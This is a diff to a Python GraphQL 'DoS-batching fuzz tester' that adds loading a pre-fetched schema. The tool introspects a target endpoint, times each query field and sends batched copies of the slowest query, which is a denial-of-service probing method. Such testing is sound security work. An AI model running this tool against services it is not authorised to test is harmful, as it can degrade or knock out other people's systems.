@@ -24,13 +24,25 @@ def load_introspection_query(path: str) -> dict:
         sys.exit(1)
 
 
+def load_schema_file(path: str) -> dict:
+    """
+    Load a pre-fetched GraphQL introspection schema result (JSON).
+    """
+    try:
+        with open(path, 'r') as f:
+            return json.load(f)
+    except Exception as e:
+        print(Fore.RED + f"Error loading schema from {path}: {e}")
+        sys.exit(1)
+
+
 def send_query(url: str, payload) -> tuple:
     """
     Send a POST to the GraphQL endpoint.
     Returns (response, elapsed_time), or (None, -1) on exception.
     """
     try:
-        start = time.time() # to measure the time for the response
+        start = time.time()  # to measure the time for the response
         resp = requests.post(url, json=payload)
         return resp, time.time() - start
     except Exception as e:
@@ -40,13 +52,13 @@ def send_query(url: str, payload) -> tuple:
 
 def extract_query_fields(schema: dict) -> list:
     """
-    Given an introspection query result, pull out all 
+    Given an introspection query result, pull out all
     top-level fields under the 'Query' type.
     """
-    types = schema.get("data", {}).get("__schema", {}).get("types", []) # extract the types from data -> __schema
+    types = schema.get("data", {}).get("__schema", {}).get("types", [])
     for t in types:
-        if t.get("name") == "Query" and t.get("fields"): # if the name of the type is "Query" and we have "fields"
-            return [f["name"] for f in t["fields"]] # then get the name contained in each field
+        if t.get("name") == "Query" and t.get("fields"):
+            return [f["name"] for f in t["fields"]]
     return []
 
 
@@ -59,7 +71,7 @@ def measure_field_timings(url: str, fields: list) -> list:
     timings = []
     for field in tqdm(fields, desc="Measuring fields"):
         payload = {"query": f"query {{ {field} }}"}
-        resp, elapsed = send_query(url, payload) # send the query for each found "Query" type
+        resp, elapsed = send_query(url, payload)
         if resp is None:
             continue
         if resp.ok:
@@ -72,12 +84,6 @@ def measure_field_timings(url: str, fields: list) -> list:
 def send_batched_queries(url: str, field: str, batch_size: int) -> None:
     """
     Construct and send a batch of identical queries for the given field.
-    Result looks like this: 
-    data = [
-        {"query":"query {\n  <name>\n}","variables":[]},
-        {"query":"query {\n  <name>\n}","variables":[]},
-        {"query":"query {\n  <name>\n}","variables":[]}
-    ]
     """
     batch = [{"query": f"query {{ {field} }}"} for _ in range(batch_size)]
     print(Fore.CYAN + f"\nSending batch of {batch_size} '{field}' queries…")
@@ -93,7 +99,6 @@ def send_batched_queries(url: str, field: str, batch_size: int) -> None:
 
 
 def main():
-    # make it configurable through terminal
     parser = argparse.ArgumentParser(
         description="GraphQL DoS-batching fuzz tester"
     )
@@ -108,45 +113,54 @@ def main():
         help="Path to introspection-query JSON file"
     )
     parser.add_argument(
+        "--schema", "-s",
+        help="Path to a pre-fetched schema JSON file (skip introspection)",
+        default=None
+    )
+    parser.add_argument(
         "--batch", "-b",
         type=int, default=3,
         help="Number of queries to send in the final batch"
     )
     args = parser.parse_args()
 
-    # 1) Load introspection file & send query
-    introspection_payload = load_introspection_query(args.introspect) # load file
-    print("Running introspection…")
-    resp, elapsed = send_query(args.url, introspection_payload) # send query
-    if resp is None or not resp.ok: # check response
-        code = resp.status_code if resp else "N/A"
-        print(Fore.RED + f"Introspection failed (HTTP {code}). Exiting.")
-        sys.exit(1)
+    # Load or fetch schema
+    if args.schema:
+        print("Loading schema from file…")
+        schema = load_schema_file(args.schema)
+        print(Fore.GREEN + f"Schema loaded from {args.schema}")
+    else:
+        # 1) Load introspection file & send query
+        introspection_payload = load_introspection_query(args.introspect)
+        print("Running introspection…")
+        resp, elapsed = send_query(args.url, introspection_payload)
+        if resp is None or not resp.ok:
+            code = resp.status_code if resp else "N/A"
+            print(Fore.RED + f"Introspection failed (HTTP {code}). Exiting.")
+            sys.exit(1)
+        print(Fore.GREEN + f"Introspection OK ({elapsed:.2f}s)")
+        schema = resp.json()
 
-    print(Fore.GREEN + f"Introspection OK ({elapsed:.2f}s)")
-
-    # 2) Extract fields from  returned schema
-    schema = resp.json() # typically formatted as json
-    fields = extract_query_fields(schema) # extraction
+    # Extract fields from schema
+    fields = extract_query_fields(schema)
     if not fields:
         print(Fore.RED + "No 'Query' fields found. Exiting.")
         sys.exit(1)
-
     print(Fore.CYAN + f"Found {len(fields)} top-level query fields.")
 
-    # 3) Measure timings of each possible query
-    timings = measure_field_timings(args.url, fields) # measuring
+    # Measure timings of each possible query
+    timings = measure_field_timings(args.url, fields)
     if not timings:
         print(Fore.RED + "None of the fields succeeded. Exiting.")
         sys.exit(1)
-    # print out and save the query with the longest overall response time
+
     slowest_field, slowest_time = timings[0]
     print(
         Fore.GREEN +
         f"\nSlowest field is '{slowest_field}' at {slowest_time:.2f}s"
     )
 
-    # 4) Send batched queries -- uses the query with the longest response time
+    # Send batched queries
     send_batched_queries(args.url, slowest_field, args.batch)
 
 
